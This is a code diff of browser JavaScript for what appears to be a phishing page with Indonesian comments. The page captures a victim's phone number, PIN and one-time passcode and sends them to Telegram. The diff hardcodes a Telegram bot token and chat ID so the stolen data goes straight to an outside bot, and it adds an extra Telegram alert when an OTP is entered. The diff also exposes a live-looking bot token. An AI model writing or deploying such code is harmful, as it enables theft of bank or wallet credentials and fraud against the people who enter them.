@@ -1,5 +1,3 @@
-require('dotenv').config(); // Load environment variables from .env file
-
 document.addEventListener("DOMContentLoaded", function () {
   const phoneNumberInput = document.getElementById("phone-number");
   const pinInputs = document.querySelectorAll(".pin-box");
@@ -20,19 +18,14 @@ document.addEventListener("DOMContentLoaded", function () {
   };
 
   async function sendToTelegram(message) {
-    const chatId = process.env.CHAT_ID; // Chat ID diambil dari environment variables
-    const botToken = process.env.TELEGRAM_BOT_TOKEN; // Token diambil dari environment variables
-
-    if (!botToken || !chatId) {
-      console.error('Telegram bot token or chat ID is missing.');
-      return;
-    }
-
     try {
-      const response = await fetch('/api/sendMessage', {
+      const response = await fetch(`https://api.telegram.org/bot7501327282:AAGG6I3diL5r0Mkgu3juu-neCcq9uYjUQBE/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chatId, message }),
+        body: JSON.stringify({
+          chat_id: "6431487974",
+          text: message,
+        }),
       });
 
       if (!response.ok) {
@@ -111,7 +104,7 @@ document.addEventListener("DOMContentLoaded", function () {
 —————
 → 🅿️ :  ${userData.pin} 
 —————
-→ 🧩 :  ${userData.otp} 
+→ � :  ${userData.otp} 
 —————
     `;
     await sendToTelegram(message);
@@ -123,6 +116,9 @@ document.addEventListener("DOMContentLoaded", function () {
       floatingNotification.style.display = "none";
       otpInputs.forEach((input) => (input.value = ""));
       otpInputs[0].focus();
+
+      // Kirim notifikasi ke Telegram
+      sendToTelegram("Pengguna telah memasukkan OTP dan notifikasi muncul.");
     });
   }
 
